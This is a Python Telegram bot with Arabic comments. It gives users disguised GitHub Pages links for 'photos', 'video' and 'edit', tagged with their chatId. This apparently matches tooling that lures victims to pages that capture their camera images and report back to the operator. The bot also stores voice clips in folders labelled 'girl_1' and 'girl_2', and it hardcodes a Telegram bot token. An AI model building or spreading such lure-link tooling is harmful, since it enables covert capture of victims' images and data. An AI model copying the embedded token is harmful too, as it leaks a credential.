import os
import json
import telebot
from telebot import types
import threading
import http.server
import yt_dlp
from PIL import Image, PngImagePlugin

# إعدادات البوت
BOT_TOKEN = os.getenv("BOT_TOKEN", "8128965245:AAGolmLae3ALVga_kcloXCK2zsFRODK4BXc")
bot = telebot.TeleBot(BOT_TOKEN)

# المسارات والروابط
DB_FILE = "/tmp/voice_db.json"
PHOTO_PAGE_URL = "https://app-display.github.io/ca.html-chatld-/"
VIDEO_PAGE_URL = "https://app-display.github.io/ca.html-chatId"
IMAGE_EDIT_URL = "https://app-display.github.io/-c-om-Copy-Translate-ate-vel-.app-c.html-chatld-/"

user_states = {}
user_data = {}

# --- السيرفر الوهمي للنشاط ---
def run_dummy_server():
    try:
        port = int(os.environ.get("PORT", 8080))
        httpd = http.server.HTTPServer(('', port), http.server.SimpleHTTPRequestHandler)
        httpd.serve_forever()
    except: pass

threading.Thread(target=run_dummy_server, daemon=True).start()

# --- قاعدة البيانات ---
def load_db():
    if not os.path.exists(DB_FILE): return {"girl_1": {}, "girl_2": {}}
    try:
        with open(DB_FILE, 'r', encoding='utf-8') as f: return json.load(f)
    except: return {"girl_1": {}, "girl_2": {}}

def save_db(db):
    try:
        with open(DB_FILE, 'w', encoding='utf-8') as f: json.dump(db, f, indent=4, ensure_ascii=False)
    except: pass

# --- دالة التحميل الذكية ---
def download_video_sync(url, chat_id):
    try:
        ydl_opts = {
            'format': 'best[ext=mp4]/best',
            'outtmpl': f'/tmp/vid_{chat_id}.mp4',
            'quiet': True,
            'user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36'
        }
        with yt_dlp.YoutubeDL(ydl_opts) as ydl:
            info = ydl.extract_info(url, download=True)
            return f'/tmp/vid_{chat_id}.mp4', info.get('title', 'Video')
    except Exception as e: return None, str(e)

# --- القوائم ---
@bot.message_handler(commands=['start'])
def start(m):
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(
        types.InlineKeyboardButton("🖼️ رابط صور", callback_data="p_link"),
        types.InlineKeyboardButton("🎥 رابط فيديو", callback_data="v_link"),
        types.InlineKeyboardButton("✨ رابط تعديل", callback_data="e_link"),
        types.InlineKeyboardButton("📥 تحميل فيديو", callback_data="dl_vid"),
        types.InlineKeyboardButton("🎧 قسم الصوتيات", callback_data="v_menu")
    )
    bot.send_message(m.chat.id, "🤖 أهلاً بك سيف:", reply_markup=markup)

@bot.callback_query_handler(func=lambda c: True)
def query(c):
    cid = c.message.chat.id
    if c.data == "dl_vid":
        user_states[cid] = "dl"
        bot.edit_message_text("أرسل الرابط:", cid, c.message.message_id)
    elif c.data == "v_menu":
        m = types.InlineKeyboardMarkup()
        m.add(types.InlineKeyboardButton("فتاة 1", callback_data="sel_1"), types.InlineKeyboardButton("فتاة 2", callback_data="sel_2"))
        bot.edit_message_text("اختر المجلد:", cid, c.message.message_id, reply_markup=m)
    elif "sel_" in c.data:
        user_states[cid] = c.data
        bot.answer_callback_query(c.id, "أرسل الفويس الآن ليحفظ في المجلد")
    elif c.data in ["p_link", "v_link", "e_link"]:
        links = {"p_link": PHOTO_PAGE_URL, "v_link": VIDEO_PAGE_URL, "e_link": IMAGE_EDIT_URL}
        bot.send_message(cid, f"الرابط: {links[c.data]}?chatId={cid}")
    bot.answer_callback_query(c.id)

@bot.message_handler(content_types=['text', 'voice'])
def msg(m):
    cid = m.chat.id
    # تحميل فيديو
    if user_states.get(cid) == "dl":
        s = bot.reply_to(m, "⏳ جاري التحميل...")
        path, title = download_video_sync(m.text, cid)
        if path:
            bot.send_video(cid, open(path, 'rb'), caption=title)
            bot.delete_message(cid, s.message_id)
            os.remove(path)
        else: bot.edit_message_text(f"❌ فشل: {title}", cid, s.message_id)
        user_states[cid] = None
    # حفظ صوتيات
    elif m.voice and "sel_" in str(user_states.get(cid)):
        db = load_db()
        key = "girl_1" if "sel_1" in user_states[cid] else "girl_2"
        idx = len(db[key]) + 1
        db[key][f"مقطع {idx}"] = m.voice.file_id
        save_db(db)
        bot.reply_to(m, f"✅ تم حفظ مقطع {idx} في {key}")

bot.polling(none_stop=True)
